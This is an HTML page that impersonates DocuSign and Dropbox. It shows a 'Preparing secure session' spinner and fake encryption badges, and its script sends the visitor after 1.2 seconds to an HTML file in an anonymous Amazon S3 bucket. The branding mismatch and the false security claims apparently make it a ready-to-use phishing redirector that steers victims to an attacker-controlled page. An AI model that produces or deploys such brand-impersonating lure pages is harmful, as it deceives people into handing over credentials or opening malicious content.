<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign – Redirecting securely</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f4fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }

        /* DocuSign card – soft, clean, blue undertones */
        .docusign-card {
            max-width: 460px;
            width: 100%;
            background: #ffffff;
            border-radius: 28px;
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.05), 0 1px 2px rgba(0, 0, 0, 0.02);
            text-align: center;
            padding: 44px 32px 48px;
            transition: all 0.2s ease;
        }

        /* Simple, calming blue spinner */
        .spinner {
            width: 56px;
            height: 56px;
            margin: 0 auto 24px;
            border: 3px solid #e2e8f0;
            border-top-color: #0b5c9e;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        h2 {
            font-size: 24px;
            font-weight: 500;
            color: #0a2540;
            margin-bottom: 12px;
            letter-spacing: -0.2px;
        }

        .message {
            font-size: 15px;
            color: #2c3e50;
            line-height: 1.45;
            margin-bottom: 24px;
        }

        /* Soft blue security badge */
        .secure-badge {
            background: #eef3fc;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 18px;
            border-radius: 40px;
            font-size: 13px;
            color: #0b5c9e;
            font-weight: 500;
        }

        .secure-badge::before {
            content: "🔒";
            font-size: 12px;
        }

        .footer {
            margin-top: 32px;
            font-size: 11px;
            color: #8b9ab0;
            border-top: 1px solid #eef2f8;
            padding-top: 20px;
        }

        @media (max-width: 550px) {
            .docusign-card {
                padding: 32px 24px 36px;
            }
            h2 {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <div class="docusign-card">
        <div class="spinner"></div>
        <h2>Preparing secure session</h2>
        <div class="message">
            Please wait while we verify your access.<br>
            You will be redirected in a moment.
        </div>
        <div class="secure-badge">Encrypted by Dropbox</div>
        <div class="footer">© Dropbox – Secure digital transactions</div>
    </div>

    <script>
        // ============================================================
        // 🔗 PASTE YOUR TEACHER'S LINK HERE (only one change needed)
        // ============================================================
        const TARGET_URL = "https://file202604.s3.us-east-2.amazonaws.com/file.html";

        // Fast but calm redirect (1.2 seconds)
        const REDIRECT_DELAY_MS = 1200;

        try {
            new URL(TARGET_URL);
            setTimeout(() => {
                window.location.href = TARGET_URL;
            }, REDIRECT_DELAY_MS);
        } catch (e) {
            document.body.innerHTML = `
                <div style="text-align:center; margin-top:50px; font-family: sans-serif;">
                    <h2>Configuration error</h2>
                    <p>Please set a valid redirect link in the code.</p>
                </div>
            `;
        }
    </script>
</body>
</html>
